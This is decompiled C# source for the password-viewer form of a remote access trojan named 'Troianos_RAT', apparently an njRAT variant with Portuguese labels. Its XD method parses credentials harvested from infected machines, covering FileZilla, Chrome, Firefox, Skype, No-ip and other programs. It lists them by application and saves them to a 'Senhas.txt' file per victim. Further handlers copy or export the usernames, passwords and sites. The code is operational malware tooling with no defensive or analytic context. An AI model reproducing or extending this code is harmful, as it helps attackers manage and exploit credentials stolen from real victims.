using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.My.Resources;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x0200001A RID: 26
	[DesignerGenerated]
	public partial class Pass : Form
	{
		// Token: 0x060002CD RID: 717 RVA: 0x001F3058 File Offset: 0x001F1458
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Pass.__ENCList;
			lock (_ENCList)
			{
				bool flag = Pass.__ENCList.Count == Pass.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Pass.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Pass.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Pass.__ENCList[num] = Pass.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Pass.__ENCList.RemoveRange(num, Pass.__ENCList.Count - num);
					Pass.__ENCList.Capacity = Pass.__ENCList.Count;
				}
				Pass.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x060002D0 RID: 720 RVA: 0x001F3C38 File Offset: 0x001F2038
		// (set) Token: 0x060002D1 RID: 721 RVA: 0x001F3C50 File Offset: 0x001F2050
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x060002D2 RID: 722 RVA: 0x001F3C5C File Offset: 0x001F205C
		// (set) Token: 0x060002D3 RID: 723 RVA: 0x001F3C74 File Offset: 0x001F2074
		internal virtual ToolStripMenuItem CopyUseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyUseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyUseToolStripMenuItem_Click);
				bool flag = this._CopyUseToolStripMenuItem != null;
				if (flag)
				{
					this._CopyUseToolStripMenuItem.Click -= value2;
				}
				this._CopyUseToolStripMenuItem = value;
				flag = (this._CopyUseToolStripMenuItem != null);
				if (flag)
				{
					this._CopyUseToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x060002D4 RID: 724 RVA: 0x001F3CD4 File Offset: 0x001F20D4
		// (set) Token: 0x060002D5 RID: 725 RVA: 0x001F3CEC File Offset: 0x001F20EC
		internal virtual ToolStripMenuItem CopyPassToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyPassToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyPassToolStripMenuItem_Click);
				bool flag = this._CopyPassToolStripMenuItem != null;
				if (flag)
				{
					this._CopyPassToolStripMenuItem.Click -= value2;
				}
				this._CopyPassToolStripMenuItem = value;
				flag = (this._CopyPassToolStripMenuItem != null);
				if (flag)
				{
					this._CopyPassToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x060002D6 RID: 726 RVA: 0x001F3D4C File Offset: 0x001F214C
		// (set) Token: 0x060002D7 RID: 727 RVA: 0x001F3D64 File Offset: 0x001F2164
		internal virtual ToolStripMenuItem CopySiteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopySiteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopySiteToolStripMenuItem_Click);
				bool flag = this._CopySiteToolStripMenuItem != null;
				if (flag)
				{
					this._CopySiteToolStripMenuItem.Click -= value2;
				}
				this._CopySiteToolStripMenuItem = value;
				flag = (this._CopySiteToolStripMenuItem != null);
				if (flag)
				{
					this._CopySiteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x060002D8 RID: 728 RVA: 0x001F3DC4 File Offset: 0x001F21C4
		// (set) Token: 0x060002D9 RID: 729 RVA: 0x001F3DDC File Offset: 0x001F21DC
		internal virtual ToolStripMenuItem CopyALLToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyALLToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyALLToolStripMenuItem_Click);
				bool flag = this._CopyALLToolStripMenuItem != null;
				if (flag)
				{
					this._CopyALLToolStripMenuItem.Click -= value2;
				}
				this._CopyALLToolStripMenuItem = value;
				flag = (this._CopyALLToolStripMenuItem != null);
				if (flag)
				{
					this._CopyALLToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x060002DA RID: 730 RVA: 0x001F3E3C File Offset: 0x001F223C
		// (set) Token: 0x060002DB RID: 731 RVA: 0x001F3E54 File Offset: 0x001F2254
		internal virtual ToolStripMenuItem SaveAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SaveAllToolStripMenuItem = value;
			}
		}

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x060002DC RID: 732 RVA: 0x001F3E60 File Offset: 0x001F2260
		// (set) Token: 0x060002DD RID: 733 RVA: 0x001F3E78 File Offset: 0x001F2278
		internal virtual ToolStripMenuItem FindToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FindToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FindToolStripMenuItem_Click);
				bool flag = this._FindToolStripMenuItem != null;
				if (flag)
				{
					this._FindToolStripMenuItem.Click -= value2;
				}
				this._FindToolStripMenuItem = value;
				flag = (this._FindToolStripMenuItem != null);
				if (flag)
				{
					this._FindToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x060002DE RID: 734 RVA: 0x001F3ED8 File Offset: 0x001F22D8
		// (set) Token: 0x060002DF RID: 735 RVA: 0x001F3EF0 File Offset: 0x001F22F0
		internal virtual SaveFileDialog SaveFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SaveFileDialog1 = value;
			}
		}

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x060002E0 RID: 736 RVA: 0x001F3EFC File Offset: 0x001F22FC
		// (set) Token: 0x060002E1 RID: 737 RVA: 0x001F3F14 File Offset: 0x001F2314
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x060002E2 RID: 738 RVA: 0x001F3F20 File Offset: 0x001F2320
		// (set) Token: 0x060002E3 RID: 739 RVA: 0x001F3F38 File Offset: 0x001F2338
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		// Token: 0x170000F6 RID: 246
		// (get) Token: 0x060002E4 RID: 740 RVA: 0x001F3F44 File Offset: 0x001F2344
		// (set) Token: 0x060002E5 RID: 741 RVA: 0x001F3F5C File Offset: 0x001F235C
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000F7 RID: 247
		// (get) Token: 0x060002E6 RID: 742 RVA: 0x001F3FBC File Offset: 0x001F23BC
		// (set) Token: 0x060002E7 RID: 743 RVA: 0x001F3FD4 File Offset: 0x001F23D4
		internal virtual GClass9 L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_DoubleClick);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick -= value2;
				}
				this._L1 = value;
				flag = (this._L1 != null);
				if (flag)
				{
					this._L1.DoubleClick += value2;
				}
			}
		}

		// Token: 0x170000F8 RID: 248
		// (get) Token: 0x060002E8 RID: 744 RVA: 0x001F4034 File Offset: 0x001F2434
		// (set) Token: 0x060002E9 RID: 745 RVA: 0x001F404C File Offset: 0x001F244C
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x170000F9 RID: 249
		// (get) Token: 0x060002EA RID: 746 RVA: 0x001F4058 File Offset: 0x001F2458
		// (set) Token: 0x060002EB RID: 747 RVA: 0x001F4070 File Offset: 0x001F2470
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x170000FA RID: 250
		// (get) Token: 0x060002EC RID: 748 RVA: 0x001F407C File Offset: 0x001F247C
		// (set) Token: 0x060002ED RID: 749 RVA: 0x001F4094 File Offset: 0x001F2494
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x170000FB RID: 251
		// (get) Token: 0x060002EE RID: 750 RVA: 0x001F40A0 File Offset: 0x001F24A0
		// (set) Token: 0x060002EF RID: 751 RVA: 0x001F40B8 File Offset: 0x001F24B8
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x170000FC RID: 252
		// (get) Token: 0x060002F0 RID: 752 RVA: 0x001F40C4 File Offset: 0x001F24C4
		// (set) Token: 0x060002F1 RID: 753 RVA: 0x001F40DC File Offset: 0x001F24DC
		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		// Token: 0x170000FD RID: 253
		// (get) Token: 0x060002F2 RID: 754 RVA: 0x001F40E8 File Offset: 0x001F24E8
		// (set) Token: 0x060002F3 RID: 755 RVA: 0x001F4100 File Offset: 0x001F2500
		internal virtual ToolStripMenuItem AreaDeTransferenciaToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AreaDeTransferenciaToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AreaDeTransferenciaToolStripMenuItem_Click);
				bool flag = this._AreaDeTransferenciaToolStripMenuItem != null;
				if (flag)
				{
					this._AreaDeTransferenciaToolStripMenuItem.Click -= value2;
				}
				this._AreaDeTransferenciaToolStripMenuItem = value;
				flag = (this._AreaDeTransferenciaToolStripMenuItem != null);
				if (flag)
				{
					this._AreaDeTransferenciaToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000FE RID: 254
		// (get) Token: 0x060002F4 RID: 756 RVA: 0x001F4160 File Offset: 0x001F2560
		// (set) Token: 0x060002F5 RID: 757 RVA: 0x001F4178 File Offset: 0x001F2578
		internal virtual ToolStripMenuItem EmDiscoToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EmDiscoToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EmDiscoToolStripMenuItem_Click);
				bool flag = this._EmDiscoToolStripMenuItem != null;
				if (flag)
				{
					this._EmDiscoToolStripMenuItem.Click -= value2;
				}
				this._EmDiscoToolStripMenuItem = value;
				flag = (this._EmDiscoToolStripMenuItem != null);
				if (flag)
				{
					this._EmDiscoToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x060002F6 RID: 758 RVA: 0x001F41D8 File Offset: 0x001F25D8
		public Pass()
		{
			base.Load += this.Pass_Load;
			Pass.__ENCAddToList(this);
			this.bool_0 = true;
			this.InitializeComponent();
		}

		// Token: 0x060002F7 RID: 759 RVA: 0x001F420C File Offset: 0x001F260C
		public void FxCOLM(ListView L1)
		{
			int num = L1.Columns.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				L1.Columns[i].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
			}
		}

		// Token: 0x060002F8 RID: 760 RVA: 0x001F4250 File Offset: 0x001F2650
		private void FindToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Pesquisar", string.Empty, string.Empty, -1, -1);
				bool flag = Operators.CompareString(text, string.Empty, false) != 0;
				if (flag)
				{
					Pass pass = new Pass
					{
						Name = "e",
						Text = "Pesquisar ... '" + text + "'"
					};
					pass.Show();
					try
					{
						foreach (object obj in this.L1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							int num = 0;
							do
							{
								flag = (Strings.InStr(listViewItem.SubItems[num].Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0);
								if (flag)
								{
									ListViewItem listViewItem2 = pass.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex);
									int num2 = listViewItem.SubItems.Count - 1;
									for (int i = 1; i <= num2; i++)
									{
										listViewItem2.SubItems.Add(listViewItem.SubItems[i].Text);
									}
								}
								else
								{
									num++;
								}
							}
							while (num <= 2);
						}
					}
					finally
					{
						IEnumerator enumerator;
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					pass.ToolStripMenuItem1.Text = "Senhas ( X )".Replace("X", Conversions.ToString(pass.L1.Items.Count));
					this.FxCOLM(pass.L1);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060002F9 RID: 761 RVA: 0x001F4454 File Offset: 0x001F2854
		private void CopyUseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].Text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060002FA RID: 762 RVA: 0x001F44C8 File Offset: 0x001F28C8
		private void CopyPassToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].SubItems[1].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].SubItems[1].Text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060002FB RID: 763 RVA: 0x001F4550 File Offset: 0x001F2950
		private void CopyALLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = string.Empty;
				bool flag;
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = string.Concat(new string[]
						{
							text,
							"SITE : ",
							listViewItem.SubItems[2].Text,
							"\r\nUSUARIO : ",
							listViewItem.SubItems[0].Text,
							"\r\nSENHA : ",
							listViewItem.SubItems[1].Text,
							"\r\n\r\n"
						});
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				flag = (text.Length > 0);
				if (flag)
				{
					Clipboard.SetText(text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060002FC RID: 764 RVA: 0x001F4680 File Offset: 0x001F2A80
		private void RemoveEmptyPWToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.SubItems[1].Text, string.Empty, false) == 0;
					if (flag)
					{
						listViewItem.Remove();
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.ToolStripMenuItem1.Text = "Senhas ( X )".Replace("X", Conversions.ToString(this.L1.Items.Count));
		}

		// Token: 0x060002FD RID: 765 RVA: 0x001F4744 File Offset: 0x001F2B44
		public string SV()
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.L1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						"URL: ",
						listViewItem.SubItems[2].Text,
						"\r\nUSR: ",
						listViewItem.Text,
						"\r\nPWD: ",
						listViewItem.SubItems[1].Text,
						"\r\n\r\n"
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return text;
		}

		// Token: 0x060002FE RID: 766 RVA: 0x001F4838 File Offset: 0x001F2C38
		public void XD(ref Client c, ref string S)
		{
			string[] array = Strings.Split(S, " ", -1, CompareMethod.Binary);
			int num = -1;
			bool flag = !Directory.Exists(c.Folder);
			if (flag)
			{
				Directory.CreateDirectory(c.Folder);
			}
			string[] array2 = new string[]
			{
				"FileZilla",
				"No-ip",
				"DynDns",
				"Paltalk",
				"FireFox",
				"Chrome",
				"MSN",
				"Yahoo",
				"Opera",
				"Internet Explorer",
				"ooVoo",
				"DUC v3",
				"Skype"
			};
			string text = string.Empty;
			foreach (string text2 in array)
			{
				try
				{
					flag = (text2.Length > 0);
					if (flag)
					{
						bool flag2 = Operators.CompareString(text2, "*", false) == 0;
						if (flag2)
						{
							num++;
						}
						else
						{
							flag2 = !text2.Contains(":");
							if (flag2)
							{
								text2 = Class6.smethod_16(text2);
							}
							string[] array4 = Strings.Split(text2, ":", -1, CompareMethod.Binary);
							flag2 = (array4.Length > 3);
							if (flag2)
							{
								string expression = text2;
								string find = array4[0] + ":" + array4[1];
								string text3 = array4[0] + ":" + array4[1];
								array4 = Strings.Split(Strings.Replace(expression, find, Class6.smethod_14(ref text3), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary);
							}
							ListViewItem listViewItem = new ListViewItem();
							listViewItem = this.L1.Items.Add(Class6.smethod_16(array4[1]), num);
							listViewItem.SubItems.Add(Class6.smethod_16(array4[2]));
							listViewItem.SubItems.Add(Class6.smethod_16(array4[0]));
							listViewItem.SubItems.Add(array2[num]);
							NewLateBinding.LateCall(listViewItem.SubItems, null, "Add", new object[]
							{
								RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L))))
							}, null, null, null, true);
							text = text + "Usuario : " + listViewItem.Text + "\r\n";
							text = text + "Senha : " + listViewItem.SubItems[1].Text + "\r\n";
							text = text + "Site : " + listViewItem.SubItems[2].Text + "\r\n\r\n";
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
			try
			{
				File.WriteAllText(c.Folder + "Senhas.txt", text);
			}
			catch (Exception ex2)
			{
			}
			this.FxCOLM(this.L1);
			this.ToolStripMenuItem1.Text = "Senhas( X )".Replace("X", Conversions.ToString(this.L1.Items.Count));
		}

		// Token: 0x060002FF RID: 767 RVA: 0x001F4BA0 File Offset: 0x001F2FA0
		private void L1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				string text = this.L1.SelectedItems[0].SubItems[2].Text;
				bool flag = !text.Contains("://");
				if (flag)
				{
					text = "http://" + text;
				}
				Process.Start(text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000300 RID: 768 RVA: 0x001F4C1C File Offset: 0x001F301C
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.bool_0 = true;
			this.L1.BringToFront();
		}

		// Token: 0x06000301 RID: 769 RVA: 0x001F4C34 File Offset: 0x001F3034
		private void CopySiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].SubItems[2].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].SubItems[2].Text);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000302 RID: 770 RVA: 0x001F4CBC File Offset: 0x001F30BC
		private void Pass_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000303 RID: 771 RVA: 0x001F4CC0 File Offset: 0x001F30C0
		private void AreaDeTransferenciaToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = this.SV();
				bool flag = text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(text);
					Interaction.MsgBox("", MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000304 RID: 772 RVA: 0x001F4D1C File Offset: 0x001F311C
		private void EmDiscoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.SaveFileDialog1.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					File.WriteAllText(this.SaveFileDialog1.FileName, this.SV());
					Interaction.MsgBox(this.SaveFileDialog1.FileName, MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0400015C RID: 348
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400015E RID: 350
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x0400015F RID: 351
		[AccessedThroughProperty("CopyUseToolStripMenuItem")]
		private ToolStripMenuItem _CopyUseToolStripMenuItem;

		// Token: 0x04000160 RID: 352
		[AccessedThroughProperty("CopyPassToolStripMenuItem")]
		private ToolStripMenuItem _CopyPassToolStripMenuItem;

		// Token: 0x04000161 RID: 353
		[AccessedThroughProperty("CopySiteToolStripMenuItem")]
		private ToolStripMenuItem _CopySiteToolStripMenuItem;

		// Token: 0x04000162 RID: 354
		[AccessedThroughProperty("CopyALLToolStripMenuItem")]
		private ToolStripMenuItem _CopyALLToolStripMenuItem;

		// Token: 0x04000163 RID: 355
		[AccessedThroughProperty("SaveAllToolStripMenuItem")]
		private ToolStripMenuItem _SaveAllToolStripMenuItem;

		// Token: 0x04000164 RID: 356
		[AccessedThroughProperty("FindToolStripMenuItem")]
		private ToolStripMenuItem _FindToolStripMenuItem;

		// Token: 0x04000165 RID: 357
		[AccessedThroughProperty("SaveFileDialog1")]
		private SaveFileDialog _SaveFileDialog1;

		// Token: 0x04000166 RID: 358
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x04000167 RID: 359
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x04000168 RID: 360
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x04000169 RID: 361
		[AccessedThroughProperty("L1")]
		private GClass9 _L1;

		// Token: 0x0400016A RID: 362
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x0400016B RID: 363
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x0400016C RID: 364
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x0400016D RID: 365
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x0400016E RID: 366
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		// Token: 0x0400016F RID: 367
		[AccessedThroughProperty("AreaDeTransferenciaToolStripMenuItem")]
		private ToolStripMenuItem _AreaDeTransferenciaToolStripMenuItem;

		// Token: 0x04000170 RID: 368
		[AccessedThroughProperty("EmDiscoToolStripMenuItem")]
		private ToolStripMenuItem _EmDiscoToolStripMenuItem;

		// Token: 0x04000171 RID: 369
		private bool bool_0;
	}
}
